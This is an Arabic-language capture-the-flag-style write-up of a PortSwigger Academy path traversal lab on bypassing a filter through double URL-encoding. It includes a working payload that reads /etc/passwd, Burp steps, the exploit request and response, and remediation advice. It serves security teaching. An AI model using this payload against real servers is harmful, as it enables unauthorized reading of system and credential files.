# Lab 04 — Traversal Sequences Stripped with Superfluous URL-Decode (التشفير المزدوج Double URL-Decode)

[![التصنيف](https://img.shields.io/badge/الفئة-Path%20Traversal-purple)]()
[![النوع](https://img.shields.io/badge/النوع-Path%20Traversal%20—%20Double%20URL-Decoding%20Bypass-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> هذا الشرح جزء من سلسلة [معامل اجتياز المسارات (Path Traversal)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 04 — Traversal Sequences Stripped with Superfluous URL-Decode (التشفير المزدوج Double URL-Decode) |
| **تصنيف الثغرة** | Path Traversal — Double URL-Decoding Bypass |
| **معيار الضعف (CWE)** | CWE-22 / CWE-172: Encoding Error |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | تجاوز فلتر التحقق بتشفير البيلود مرتين لفك تشفيره داخل تطبيق الباك إند بعد اجتياز الفلتر. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يقوم خادم الويب الخارجي أو البروكسي بفحص الرابط قبل وصوله لكود التطبيق الداخلي. يقوم البروكسي بفك تشفير الرابط لمرة واحدة: إذا وجد `../` يقوم بمنعه فوراً.

**الخلل الفكري هنا:** في كود الباك إند، قام المطور باستدعاء دالة فك تشفير إضافية بدون داعٍ: `filename = urldecode(request.get("filename"))`!
عندما يقوم المهاجم بتشفير الـ `../` مرتين:
- النقطة `.` تشفر إلى `%252e`
- السلاش `/` تشفر إلى `%252f`
- البيلود المزدوج: `%252e%252e%252f`
عندما يصل الطلب للبروكسي، يفك التشفير الأول، فيتحول إلى: `%2e%2e%2f` (وهو نص لا يطابق `../` فيسمح له البروكسي بالمرور). وعندما يصل للباك إند، يستدعي المطور دالة `urldecode` ثانية، فتتحول إلى `../` الحقيقية وتقرأ الملف!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستغل وجود فك تشفير زائد في طبقة الباك إند بعد طبقة الفلترة لتمرير الرموز الخطيرة مشفرة مزدوجاً.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
فك التشفير الزائد وغير المتزامن بين طبقات التطبيق وخادم الويب.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. اعترض طلب الصورة في Burp Suite وأرسله إلى **Repeater**.
2. جرب إرسال التشفير العادي `..%2f` ولاحظ أنه محظور.
3. قم بتشفير البيلود مرتين ليصبح:
`filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`.
4. أرسل الطلب، ولاحظ أن السيرفر قبل الطلب ورد بـ `200 OK` وعرض ملف `/etc/passwd` كاملاً!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز جدران الحماية الخارجية (WAFs) وقراءة ملفات النظام.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

عدم استدعاء دوال فك التشفير اليدوية (`urldecode`) على مدخلات تم فك تشفيرها بالفعل بواسطة خادم الويب، والاعتماد على Canonical Path.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
